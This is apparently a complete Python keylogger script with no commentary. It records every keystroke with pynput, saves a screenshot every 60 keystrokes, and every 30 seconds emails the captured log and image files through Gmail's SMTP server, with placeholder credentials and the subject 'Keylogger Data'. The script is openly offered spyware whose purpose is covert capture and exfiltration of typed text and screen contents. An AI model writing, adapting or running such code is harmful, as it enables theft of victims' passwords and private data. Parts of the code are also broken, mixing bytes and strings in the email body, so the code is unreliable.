from pynput import keyboard
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyListener
from smtplib import SMTP
from threading import Timer
from PIL import ImageGrab
import io

log = ""
screenshot_count = 0
screenshot_paths = []

def callback_function(key):
    global log, screenshot_count

    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)

    # Take a screenshot every 60 keystrokes (adjust as needed)
    screenshot_count += 1
    if screenshot_count == 60:
        take_screenshot()
        screenshot_count = 0

def take_screenshot():
    global screenshot_paths

    # Capture the screenshot
    screenshot = ImageGrab.grab()

    # Save the screenshot to a file
    screenshot_path = f"screenshot_{len(screenshot_paths)}.png"
    screenshot.save(screenshot_path)
    screenshot_paths.append(screenshot_path)

def send_email(email, password, message, attachments=None):
    email_server = SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)

    email_message = f"Subject: Keylogger Data\n\n{message}"
    
    if attachments:
        for attachment in attachments:
            with open(attachment, "rb") as file:
                email_server.sendmail(email, email, email_message + file.read())

    else:
        email_server.sendmail(email, email, email_message)

    email_server.quit()

def thread_function():
    global log, screenshot_paths
    send_email("user@gmail.com", "password", log.encode('utf-8'), screenshot_paths)
    log = ""
    screenshot_paths = []
    timer_object = Timer(30, thread_function)
    timer_object.start()

keylogger_listener = keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
